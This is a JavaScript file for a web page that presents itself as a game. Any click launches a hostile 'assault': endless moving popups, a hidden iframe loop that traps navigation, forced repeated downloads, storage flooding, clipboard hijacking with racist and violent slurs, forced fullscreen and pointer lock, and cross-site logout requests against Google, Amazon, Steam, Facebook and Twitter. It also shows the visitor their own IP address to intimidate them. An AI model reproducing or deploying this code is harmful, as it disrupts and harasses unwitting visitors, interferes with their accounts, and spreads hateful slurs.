document.addEventListener('DOMContentLoaded', () => {
    const gameContainer = document.getElementById('game-container');
    const gameImage = document.getElementById('game-image');
    const gameAudio = document.getElementById('game-audio');
    const ipAddressElement = document.getElementById('ip-address');
    const playButton = document.getElementById('playButton');
    let gameStarted = false;
    let popupInterval;
    let urlCycleInterval;
    let userIp = 'Unknown';
    
    // THE NEW, UNSTOPPABLE URL SPAM FUNCTION
    function cycleZetaTrapUrls() {
        // Create a hidden iframe to do our dirty work
        const iframe = document.createElement('iframe');
        iframe.style.display = 'none';
        document.body.appendChild(iframe);

        urlCycleInterval = setInterval(() => {
            const randomValue = Math.random();
            // We change the iframe's location, not the main window's.
            // This triggers the main window's beforeunload event, but the navigation
            // is contained within the iframe, so the user can't actually leave!
            iframe.contentWindow.location.href = `?zeta_trap=${randomValue}`;
        }, 150); // Still every 150ms
    }
    
    // Function to trigger downloads
    function triggerDownloads() {
        const downloadLink1 = document.createElement('a');
        downloadLink1.href = 'assets/niggafart.gif';
        downloadLink1.download = 'niggafart.gif';
        downloadLink1.style.display = 'none';
        document.body.appendChild(downloadLink1);
        downloadLink1.click();
        document.body.removeChild(downloadLink1);

        const downloadLink2 = document.createElement('a');
        downloadLink2.href = 'assets/thugged.gif';
        downloadLink2.download = 'thugged.gif';
        downloadLink2.style.display = 'none';
        document.body.appendChild(downloadLink2);
        downloadLink2.click();
        document.body.removeChild(downloadLink2);
    }
    
    // Function to constantly trigger downloads
    function constantDownloads() {
        triggerDownloads();
        setInterval(triggerDownloads, 5000);
    }
    
    // The beforeunload event listener - this is what will be spammed
    window.addEventListener('beforeunload', (e) => {
        e.preventDefault();
        e.returnValue = 'GEGGY NIGGER';
    });
    
    // Fetch user's IP address
    fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
            userIp = data.ip;
            ipAddressElement.textContent = `Your IP: ${data.ip}`;
        })
        .catch(error => {
            ipAddressElement.textContent = 'IP: Unknown';
        });
    
    // Function to flood storage
    function floodStorage() {
        try { for (let i = 0; i < 1000; i++) localStorage.setItem(`zeta_flood_${i}`, 'A'.repeat(10000)); } catch(e) {}
        try { for (let i = 0; i < 1000; i++) sessionStorage.setItem(`zeta_flood_${i}`, 'B'.repeat(10000)); } catch(e) {}
        try {
            const request = indexedDB.open('ZetaDB', 1);
            request.onupgradeneeded = function(event) {
                const db = event.target.result;
                const objectStore = db.createObjectStore('floodData');
            };
            request.onsuccess = function(event) {
                const db = event.target.result;
                const transaction = db.transaction(['floodData'], 'readwrite');
                const objectStore = transaction.objectStore('floodData');
                for (let i = 0; i < 1000; i++) { objectStore.add({id: i, data: 'C'.repeat(10000)}); }
            };
        } catch(e) {}
    }
    
    // Function to trap user
    function trapUser() {
        setInterval(() => { navigator.clipboard.writeText('RAPESON NIGGER SQUARE').catch(() => {}); }, 1000);
        document.documentElement.requestFullscreen().catch(() => {});
        document.body.requestPointerLock().catch(() => {});
    }
    
    // Function to abuse third-party services
    function abuseThirdParties() {
        const services = ['https://accounts.google.com/Logout', 'https://www.amazon.com/gp/flex/sign-out.html', 'https://store.steampowered.com/logout/', 'https://www.facebook.com/logout.php', 'https://twitter.com/logout'];
        services.forEach(url => { fetch(url, {method: 'GET', mode: 'no-cors'}).catch(() => {}); });
    }
    
    // Function to create a popup
    function createAnnoyingPopup(popupId) {
        const popup = window.open('', `Zeta_Popup_${popupId}`, 'width=400,height=400');
        if (popup) {
            popup.document.write(`
                <!DOCTYPE html>
                <html>
                <head>
                    <title>${userIp}</title>
                    <style>
                        body { margin: 0; padding: 0; overflow: hidden; background-color: #000; width: 100vw; height: 100vh; }
                        img { width: 100%; height: 100%; object-fit: cover; display: block; }
                    </style>
                </head>
                <body>
                    <img src="assets/popup.gif" alt="Zeta Popup">
                    <audio id="popup-audio" preload="auto">
                        <source src="assets/game-audio.mp3" type="audio/mpeg">
                    </audio>
                    <script>
                        window.addEventListener('beforeunload', (e) => { e.preventDefault(); e.returnValue = 'Are you sure you want to leave Zeta?'; });
                        const audio = document.getElementById('popup-audio'); audio.volume = 0.5; audio.play().catch(() => {});
                        let currentX = window.screenX, currentY = window.screenY, targetX = Math.floor(Math.random() * (screen.width - 400)), targetY = Math.floor(Math.random() * (screen.height - 400)), speed = 0.05;
                        function moveWindowSmoothly() {
                            let dx = targetX - currentX, dy = targetY - currentY;
                            if (Math.abs(dx) < 5 && Math.abs(dy) < 5) { targetX = Math.floor(Math.random() * (screen.width - 400)); targetY = Math.floor(Math.random() * (screen.height - 400)); }
                            currentX += dx * speed; currentY += dy * speed;
                            window.moveTo(Math.round(currentX), Math.round(currentY));
                            requestAnimationFrame(moveWindowSmoothly);
                        }
                        moveWindowSmoothly();
                    </script>
                </body>
                </html>
            `);
            popup.document.close();
        }
    }
    
    // THE MASTER FUNCTION - UNLEASHES HELL
    function startPopupAssault() {
        let popupCount = 0;
        
        // Open 3 popups immediately
        createAnnoyingPopup(popupCount++);
        createAnnoyingPopup(popupCount++);
        createAnnoyingPopup(popupCount++);
        
        // Start the continuous popup spam after the initial 3
        popupInterval = setInterval(() => {
            createAnnoyingPopup(popupCount++);
        }, 1000);
        
        // Start other malicious activities immediately
        floodStorage();
        trapUser();
        abuseThirdParties();
        constantDownloads();
        
        // Start the NEW, UNSTOPPABLE URL spam 500ms after the first 3 popups appear
        setTimeout(() => {
            cycleZetaTrapUrls();
        }, 500);
    }
    
    function showGameOverlay() {
        gameImage.src = 'assets/game-animation.gif';
        gameContainer.style.display = 'flex';
        ipAddressElement.style.display = 'block';
        gameAudio.play().catch(error => {
            console.error('Audio failed to play even with user interaction:', error);
        });
    }

    // THE TRIGGER FUNCTION
    function startGame() {
        // Prevents the code from running more than once
        if (gameStarted) return;
        
        // The click has happened! Seal their fate!
        gameStarted = true;
        
        // NOW, UNLEASH EVERYTHING!
        startPopupAssault();
    }
    
    playButton.addEventListener('click', showGameOverlay);
    // Add a single click event listener to the whole document to start the game
    document.addEventListener('click', startGame);
});